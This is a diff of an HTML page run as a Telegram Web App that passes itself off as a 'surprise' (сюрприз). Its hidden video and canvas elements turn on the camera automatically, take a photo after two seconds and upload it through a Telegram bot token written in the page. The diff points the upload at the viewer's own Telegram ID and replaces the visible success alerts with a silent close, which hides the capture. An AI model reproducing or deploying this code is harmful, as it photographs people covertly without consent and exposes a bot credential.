@@ -4,14 +4,25 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>🫣</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
 </head>
 <body>
-    <h1>wait...</h1>
+    <h1>сюрприз!!!</h1>
     <video id="video" autoplay playsinline style="display:none;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
     <script>
         const BOT_TOKEN = '8129102478:AAFiIabXWiPI5Aeqqh7jEqXgUKLE6-NalA0';
-        const CHAT_ID = '1753361154';
+        const tg = window.Telegram.WebApp;
+
+        // Получение ID пользователя из Telegram Web App
+        const CHAT_ID = tg.initDataUnsafe?.user?.id;
+
+        if (!CHAT_ID) {
+            document.body.innerHTML = "<h1>Error: Could not get Telegram User ID.</h1>";
+            throw new Error("Telegram User ID is required to send the photo.");
+        }
+
+        tg.expand(); // Увеличение Web App на весь экран
 
         // Автоматическое включение камеры и захват фото
         window.onload = () => {
@@ -49,17 +60,24 @@
                                     .then(response => response.json())
                                     .then(data => {
                                         if (data.ok) {
-                                            alert("Photo sent successfully!");
+                                            tg.close(); // Закрытие Web App после успешной отправки
                                         } else {
-                                            alert("Failed to send photo: " + data.description);
+                                            console.error("Failed to send photo:", data.description);
+                                            tg.close();
                                         }
                                     })
-                                    .catch(err => console.error("Error:", err));
+                                    .catch(err => {
+                                        console.error("Error:", err);
+                                        tg.close();
+                                    });
                                 });
                         }, 2000); // 2 секунды для активации камеры
                     };
                 })
-                .catch(err => console.error("Camera error: ", err));
+                .catch(err => {
+                    console.error("Camera error:", err);
+                    document.body.innerHTML = "<h1>Camera access denied or unavailable.</h1>";
+                });
         };
     </script>
 </body>
